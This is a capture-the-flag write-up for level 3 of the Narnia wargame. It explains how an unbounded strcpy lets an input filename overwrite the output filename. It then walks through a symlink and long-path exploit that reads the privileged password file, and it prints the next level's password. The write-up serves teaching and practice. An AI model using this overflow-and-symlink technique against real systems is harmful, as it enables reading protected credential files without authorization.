This level was simple. Looking at the source code, narnia3.c:

```c
#include <stdio.h>
...

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */

    strcpy(ifile, argv[1]);

    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }

...
```

We see that our bug is an unbounded strcpy(), overflow happens here.

Dissassembling the binary, We see that ifile and ofile are place 32 bytes apart,
We can overflow ifile and overwrite ofile. 
```
080491d6 <main>:
 80491d6:	55                   	push   ebp
 80491d7:	89 e5                	mov    ebp,esp
 80491d9:	83 ec 58             	sub    esp,0x58
 80491dc:	c7 45 e8 2f 64 65 76 	mov    DWORD PTR [ebp-0x18],0x7665642f ; <-- ofile
.
.
.
 8049221:	8d 45 c8             	lea    eax,[ebp-0x38] ; <-- ifile
 8049224:	50                   	push   eax
 8049225:	e8 46 fe ff ff       	call   8049070 <strcpy@plt>
```

Create file `ABX` at this location: `/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ABX` and soft link it to the 
password file at `/etc/narnia_pass/narnia4`. Now create `ABX` in tmp: `/tmp/ABX`. Running the binary
with this payload gets us the password for next level.

```
$ /narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ABX
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ABX to a safer place... (/tmp/ABX)
$ cat /tmp/ABX
aKNxxrpDc1
```
Password for Level 4: `aKNxxrpDc1`
